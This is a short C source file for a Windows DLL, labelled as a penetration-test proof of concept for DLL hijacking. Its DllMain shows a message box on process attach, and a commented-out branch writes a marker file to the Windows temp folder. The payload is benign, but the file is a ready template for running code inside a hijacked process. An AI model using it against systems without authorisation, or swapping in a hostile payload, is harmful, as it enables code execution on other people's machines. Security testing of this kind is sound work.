// poc.c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
            MessageBoxA(NULL, "DLL Hijacking PoC - Code Execution Achieved",
                        "Pentest PoC", MB_OK | MB_ICONEXCLAMATION);
            // Alternative non-interactive proof, useful for automated tests / no GUI session:
            // FILE *f = fopen("C:\\Windows\\Temp\\dll_hijack_poc.txt", "w");
            // if (f) { fprintf(f, "Hijacked by: %s\n", "poc.dll"); fclose(f); }
            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
